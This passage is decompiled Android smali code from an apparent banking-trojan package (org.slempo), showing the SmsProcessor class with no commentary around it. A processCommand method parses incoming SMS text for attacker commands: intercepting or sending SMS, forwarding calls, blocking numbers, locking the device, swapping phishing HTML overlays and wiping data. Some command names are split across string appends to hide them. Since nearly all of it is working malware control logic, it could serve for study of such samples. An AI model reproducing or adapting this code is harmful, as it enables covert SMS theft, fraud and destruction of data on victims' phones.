    invoke-static {v3, v4, v0}, Lorg/slempo/service/utils/Utils;->putStringValue(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)V

    .line 144
    new-instance v3, Lorg/json/JSONArray;

    invoke-direct {v3, v0}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    invoke-static {v3}, Lorg/slempo/service/MainService;->updateHTML(Lorg/json/JSONArray;)V

    .line 145
    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-static {v3}, Lorg/slempo/service/utils/Sender;->sendHTMLUpdated(Landroid/content/Context;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 149
    .end local v0    # "data":Ljava/lang/String;
    .end local v2    # "jObject":Lorg/json/JSONObject;
    :goto_0
    return-void

    .line 146
    :catch_0
    move-exception v1

    .line 147
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method private processWipeDataCommand()V
    .locals 0

    .prologue
    .line 152
    invoke-static {}, Lorg/slempo/service/MainService;->wipeData()V

    .line 153
    return-void
.end method

.method private scheduleLaunch(Ljava/lang/String;Ljava/lang/String;I)V
    .locals 7
    .param p1, "action"    # Ljava/lang/String;
    .param p2, "values"    # Ljava/lang/String;
    .param p3, "startDelay"    # I

    .prologue
    const/4 v6, 0x0

    .line 129
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 130
    .local v0, "cal":Ljava/util/Calendar;
    const/16 v3, 0xc

    invoke-virtual {v0, v3, p3}, Ljava/util/Calendar;->add(II)V

    .line 131
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 132
    .local v1, "intent":Landroid/content/Intent;
    const-string v3, "values"

    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->params:Ljava/lang/String;

    invoke-virtual {v1, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 133
    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->context:Landroid/content/Context;

    invoke-static {v3, v6, v1, v6}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 134
    .local v2, "pi":Landroid/app/PendingIntent;
    iget-object v3, p0, Lorg/slempo/service/utils/SmsProcessor;->am:Landroid/app/AlarmManager;

    invoke-virtual {v0}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v3, v6, v4, v5, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 135
    return-void
.end method


# virtual methods
.method public getControlNumber()Ljava/lang/String;
    .locals 3

    .prologue
    .line 294
    iget-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v1, "CONTROL_NUMBER"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public needToInterceptIncoming()Z
    .locals 3

    .prologue
    .line 285
    iget-object v0, p0, Lorg/slempo/service/utils/SmsProcessor;->settings:Landroid/content/SharedPreferences;

    const-string v1, "INTERCEPTING_INCOMING_ENABLED"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    return v0
.end method

.method public needToListen()Z
    .locals 1

    .prologue
    .line 290
    const/4 v0, 0x1

    return v0
.end method

.method public processCommand()Z
    .locals 7

    .prologue
    const/4 v3, 0x0

    const/4 v6, -0x1

    .line 73
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 74
    .local v0, "builder":Ljava/lang/StringBuilder;
    const-string v4, "#send"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 75
    const-string v4, "_sms"

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 76
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 77
    .local v1, "forward":Ljava/lang/StringBuilder;
    const-string v4, "#forward"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 78
    const-string v4, "_calls"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 79
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->hasCommand()Z

    move-result v2

    .line 80
    .local v2, "hasCommand":Z
    if-eqz v2, :cond_0

    .line 81
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#intercept_sms_start"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_1

    .line 82
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processInterceptSMSStartCommand()V

    .line 115
    :goto_0
    const/4 v3, 0x1

    :cond_0
    return v3

    .line 83
    :cond_1
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#intercept_sms_stop"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_2

    .line 84
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processInterceptSMSStopCommand()V

    goto :goto_0

    .line 85
    :cond_2
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#block_numbers"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_3

    .line 86
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processBlockNumbersCommand()V

    goto :goto_0

    .line 87
    :cond_3
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#unblock_all_numbers"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_4

    .line 88
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processUnblockAllNumbersCommand()V

    goto :goto_0

    .line 89
    :cond_4
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#unblock_numbers"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_5

    .line 90
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processUnblockNumbersCommand()V

    goto :goto_0

    .line 91
    :cond_5
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#lock"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_6

    .line 92
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processLockCommand()V

    goto :goto_0

    .line 93
    :cond_6
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#unlock"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_7

    .line 94
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processUnlockCommand()V

    goto :goto_0

    .line 95
    :cond_7
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_8

    .line 96
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processSendMessageCommand()V

    goto :goto_0

    .line 97
    :cond_8
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#control_number"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_9

    .line 98
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processControlNumberCommand()V

    goto :goto_0

    .line 99
    :cond_9
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_a

    .line 100
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processForwardCallsCommand()V

    goto/16 :goto_0

    .line 101
    :cond_a
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#show_html"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_b

    .line 102
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processShowHTMLCommand()V

    goto/16 :goto_0

    .line 103
    :cond_b
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#disable_forward_calls"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_c

    .line 104
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processDisableForwardCallsCommand()V

    goto/16 :goto_0

    .line 105
    :cond_c
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#update_html"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_d

    .line 106
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processUpdateHTMLCommand()V

    goto/16 :goto_0

    .line 107
    :cond_d
    iget-object v4, p0, Lorg/slempo/service/utils/SmsProcessor;->data:Ljava/lang/String;

    const-string v5, "#wipe_data"

    invoke-virtual {v4, v5}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v6, :cond_0

    .line 108
    invoke-direct {p0}, Lorg/slempo/service/utils/SmsProcessor;->processWipeDataCommand()V

    goto/16 :goto_0
.end method
